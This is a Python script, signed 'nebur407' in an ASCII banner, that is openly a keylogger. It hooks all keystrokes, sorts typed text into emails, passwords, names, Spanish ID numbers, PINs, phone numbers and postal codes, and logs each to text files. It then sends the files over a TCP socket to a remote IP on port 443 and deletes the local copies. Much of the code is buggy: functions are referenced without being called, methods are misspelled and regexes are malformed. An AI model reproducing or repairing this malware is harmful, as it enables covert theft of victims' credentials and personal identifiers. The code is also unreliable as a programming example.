print("""
     4    000   77777
    44   0   0     77
   4 4   0   0    77
  44444  0   0   77
     4   0   0  77
     4    000  77

******************************
*  realizado por nebur407    *
******************************

""")

import keyboard
import sys
import socket 
import os 
import re
 
palabra = ""

def pulsacion_tecla(pulsacion):
    global palabra

    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == ["enter", "space"] :
            if(comprobar_esCorreo(palabra)):
                correo = palabra
                resetear_palabra
                if(comprobar_esContraseña(palabra)):
                    contraseña = palabra
                    guardar_correo_contraseña(correo, contraseña)
                else:
                    guardar_correo 
            else:
                tipo_palabra(palabra)
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
            palabra += pulsacion.name


keyboard.hook(pulsacion_tecla)

def guardar_palabra_al_espacio():
    with open("palabras.txt", "a") as file:

        file.write(palabra + "\n ")
    print ("Palabra registrada " +palabra)
    resetear_palabra()

def guardar_contraseña():
    with open("psswd.txt", "a") as file:

        file.write(palabra + "\n ")
    print ("Psswd registrada " +palabra)
    resetear_palabra()

def guardar_correo():
    with open("correo.txt", "a") as file:

        file.write(palabra + "\n ")
    print ("correo registrado " +palabra)
    resetear_palabra()

def guardar_correo_contraseña(correo, contraseña):
    with open("cpsswd.txt", "a") as file:

        file.write(correo + " " +contraseña)
    print ("correo registrado: " +correo, " contraseña registrada:" +contraseña)
    resetear_palabra()

def guardar_idPer():
    with open("id.txt", "a") as file:

        file.write(palabra + "\n ")
    print ("id: " +palabra)
    resetear_palabra()

def guardar_nombreApellido():
    with open("nombres.txt", "a") as file:

        file.write(palabra + "\n ")
    print ("nombres: " +palabra)
    resetear_palabra()

def guardar_pin():
    with open("pin.txt", "a") as file:

        file.write(palabra + "\n ")
    print ("pin: " +palabra)
    resetear_palabra()

def guardar_numero():
    with open("numero.txt", "a") as file:

        file.write(palabra + "\n ")
    print ("numero: " +palabra)
    resetear_palabra()

def guardar_cp():
    with open("cp.txt", "a") as file:

        file.write(palabra + "\n ")
    print ("cp: " +palabra)
    resetear_palabra()


def resetear_palabra():
    global palabra
    palabra = ""

def comprobar_esContraseña(palabra):
    if len(palabra)< 8:
        return False
    mayus = any(c.isupper() for c in palabra)
    num = any(c.isdigit() for c in palabra)
    espc = any(c.isalnum() for c in palabra)
    if num or espc or len(palabra) > 10:
        if num and mayus and espc:
            return True
        elif num and espc:
            return True
        elif mayus and num: 
            return True
        elif mayus and espc:
            return True 
        return True
    else:
        return False 
    
def comprobar_esCorreo(palabra):
    correo = patron = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
    return re.match(correo,palabra)

def comprobar_esNumero(palabra):
    num = all(c.isdigit()for c in palabra)
    if(num and len(palabra)>=5 and len(palabra)<=20):
        return True
    else:
        return False
    
def comprobar_esNombreApellido(palabra):
    letra = any(c.isuspper() for c in palabra)
    if(letra and len(palabra)>3 and len(palabra)<=20):
        return True 
    else:
        return False
    
def comprobar_esPin(palabra):
    num = any(c.isdigit() for c in palabra)
    letra = any(c.ischar() for c in palabra)
    if(num or letra and len(palabra)>=4 and len(palabra)<=6): 
        return True 
    else:
        return False 
    
def comprobar_esCP(palabra):
    num = all(c.isdigit for c in palabra)
    if(num and len(palabra)==5):
        return True
    else:
        return False
    
def comprobar_esDni(palabra):
    dni = "[0-9]{8}][A-Z]"
    nie = "[X-Z][0-9]}{7}[A-Z]"
    cif = "[A-H][K-N][P-S][U-W][0-9]"
    if(re.match(dni,palabra) or re.match(nie,palabra) or re.match(cif,palabra)):
        return True
    else:
        return False
def tipo_palabra(palabra):
    if(comprobar_esContraseña(palabra)):
        guardar_contraseña
    elif(comprobar_esNombreApellido(palabra)):
        guardar_nombreApellido
    elif(comprobar_esDni(palabra)):
        guardar_idPer
    elif(comprobar_esNumero(palabra)):
        guardar_numero
    elif(comprobar_esPin(palabra)):
        guardar_pin
    elif(comprobar_esCP(palabra)):
        guardar_cp

        

    
def enviar_archivo_via_sockets(archivo, ip, puerto):
    try: 
        with open (archivo, "r") as file:
                contenido = file.read()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexion:
                conexion.connect((ip,puerto))
                conexion.sendall(contenido.encode())
                os.remove(archivo)
                sys.exit()
    except Exception as e:
        print("hubo un error en la conexion" +e)

def detener_script():
    print("Detenemos sprit y enviamos los archivos")
    keyboard.hook()
    for archivo in archivos:
        enviar_archivo_via_sockets(archivo, ip, puerto)

ip = "192.168."
puerto = "443"
archivos = ["palabras.txt","psswd.txt","correo.txt","cpsswd.txt","nombres.txt","id.txt","cp.txt","numero.txt","pin.txt"]

try: 
    keyboard.wait("power key") or keyboard.wait("power botton")
except  KeyboardInterrupt:
    print ("Script detenido")
    pass